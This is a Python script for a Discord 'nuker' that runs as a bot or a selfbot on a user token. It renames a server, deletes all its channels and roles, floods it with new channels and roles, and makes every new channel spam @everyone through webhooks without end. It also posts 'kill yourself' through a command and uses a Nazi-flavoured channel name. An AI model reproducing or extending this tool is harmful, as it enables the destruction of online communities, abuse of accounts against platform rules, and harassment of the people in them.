import discord
from discord.ext import commands
import threading
import json
import time
import requests
import os
from discord.ext.commands import CommandNotFound
import random
import colorama
from colorama import Fore, Back, Style
import asyncio

token = "" #token here

prefix = "$"

spam = "@everyone"
channel_name = 'heil-eitor'
role_name = 'real'

def clear():
    os.system("cls")

clear()

def check():
    headers = {
    "authorization": token
    }
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if r.status_code == 200:
        return "user"
    elif r.status_code == 429:
        os.system("cls")
        print(f"""
        You are being rate limited! retry again in a few minutes.""")
        input()
    else:
        return "bot"

user = 'user'





if user == check():
    try:
        intents = discord.Intents.default()
        intents.members = True
        real = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
        real.remove_command("help")
        headers = {
        "authorization": token
        }
    except:
        pass
else:
    try:
        intents = discord.Intents.default()
        intents.members = True
        real = commands.Bot(command_prefix=prefix, intents=intents)
        real.remove_command("help")
        headers = {
        "authorization": f"Bot {token}"
        }
    except:
        pass  


def cdel1():
    t = threading.Thread(target=chn1)
    t.start()

def chn1():
    try:
        r = requests.delete(f"https://discord.com/api/v9/channels/{chn_id}", headers=headers)
        if r.status_code == 429:
            n = r.json()
            time.sleep(n['retry_after'])
    except:
        pass

nuke1 = False

def channel1():
    payload = {
        "name": channel_name,
        "type": "0"
    }
    try:
        for i in range(100):
            r = requests.post(f"https://discord.com/api/v9/guilds/{sid}/channels", headers=headers, json=payload)
            if r.status_code == 429:
                s = r.json()
                time.sleep(s['retry_after'])
    except:
        pass


def chnthread():
    global nuke1
    nuke1 = True
    for i in range(20):
        t = threading.Thread(target=channel1)
        t.start()    

def chnthread1():
    for i in range(20):
        t = threading.Thread(target=channel1)
        t.start()    

@real.command()
async def info(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        print(f"\n          there are :\n           {len(ctx.guild.channels)} Channels \n           {len(ctx.guild.roles)} Roles")
    except:
        pass




@real.command()
async def cdel(ctx):
    global chn_id
    try:
        await ctx.message.delete()
    except:
        pass
    for c in ctx.guild.channels:
        chn_id = c.id
        cdel1()




@real.command()
async def nuke(ctx):
    global chn_id
    global nuke1
    global sid
    sid = ctx.guild.id
    nuke1 == True
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        await ctx.guild.edit(name="funny")
    except:
        pass
    try:
        for chn in ctx.guild.channels:
            chn_id = chn.id
            cdel1()
    except:
        pass
    await chnthread()
    role()




async def role():
    try:
        rdel()
        roles()
    except:
        pass

@real.command()
async def cflood(ctx):
    global sid
    sid = ctx.guild.id
    try:
        await ctx.message.delete()
    except:
        pass
    await chnthread1()

async def roles(ctx):
    for i in range(50):
        await ctx.guild.create_role(name=role_name)

async def rdel(ctx):
    for role in ctx.guild.roles:
        await role.delete()



@real.event
async def on_ready():
    clear()
    print(f"""\u001b[31;1m
                                
                                                                                .
                                       .S_sSSb        sSSSSsSb      .S_SSSb    S.      
                                      .SS~YS%%b      d%%SsSSSPL  ,sSS~SSSSSS  SS.     
                                      S%S     `S%    d%S'       S%S     SSS  S%S     
                                      S%S      S%    S%S        S%S     S%S  S%S     
                                      S%S      ds    S&S        S%S%SSSSS%S  S&S      
                                      S&S     .Ss    S&S_SSSSL  S&S  SSSS%S  S&S  \u001b[0m
                                  \u001b[31;2m    S&S_sdSSS      S&S~SSSSP  S&S     S&S  S&S     
                                      S&S~YSY%b      S&S        S&S     S&S  S&S     
                                      S*S     `S%b   S*b        S*S     S&S  S*b
                                      S*S      S%S   S*S.       S*S     S*S  S*S       
                                      S*S      S&S    SSSbSsSsp S*S     S*S  S&S  \u001b[0m
                                  \u001b[38;2;128;0;0m    S*S      SSS     YSSSSSP  SSS     S*S  S&SL 
                                      SP       SSS                       SP   SSSbsSSSSP    
                                     Y           I                       Y                \u001b[0m
                                      
                                              \u001b[31;1mMade by དΔØŜཌ eitor(real)#0368\u001b[0m
                                          \u001b[33;1mConnected in : [ {real.user.name}#{real.user.discriminator} ]\u001b[33;1m
                                          ID : [{real.user.id} ] {Fore.RESET}
                                    
                          \u001b[31;1m[============\u001b[0m\u001b[31;2m Type {prefix}cmds to get a list of the commands. {Fore.RESET}\u001b[31;1m============]\u001b[0m""") 
                                

@real.event
async def on_command_error(ctx, a):
    if isinstance(a, CommandNotFound):
        try:
            await ctx.message.delete()
        except:
            pass

@real.event
async def on_guild_channel_create(channel):
    global nuke1
    if nuke1 == True:
        try:
            webhook = await channel.create_webhook(name="real")
            while True:
                await webhook.send(spam)
        except:
            pass


@real.command()
async def rolescan(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        print(f"\n             {ctx.guild.name}'s roles; \n           ================================")
        for role in ctx.guild.roles:
            print(f"             -> {role}")
    except:
        pass
    print("           ========================\n                    - P.S : The roles perms are in order (probably).")


@real.command()
async def cmds(ctx):
    try: 
        await ctx.message.delete()
    except:
        pass
    try:
        a = await ctx.send("""```diff
- ______________[ - Real - ]_______________
-[ - $nuke [cocks the server    ]          ]
-[ - $cdel [deletes the channels]          ]
-[ - $cflood [channel spam]                ]
-[ - $info [number of channels and roles]  ]
-[ - $rolescan [gets all roles coz yes]    ]
-[ - $hi [does the funni]                  ]
-[ ========================================]
-[ - will ad a massban soon                ]
-[ - on a bot is faster than selfbot       ]
-[ ======================================= ]```""")
        asyncio.sleep(16)
        await a.delete()
    except:
        pass

@real.command()
async def hi(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        a = await ctx.channel.send("kill yourself")
    except:
        pass
    asyncio.sleep(3)
    await a.delete()


if user == check():
    try:
        real.run(token, bot=False)
    except:
        print("Invalid token. Press anything to exit.")
        input()
else:
    try:
        real.run(token)
    except:
        print("Invalid token. Press anything to exit.")
        input()
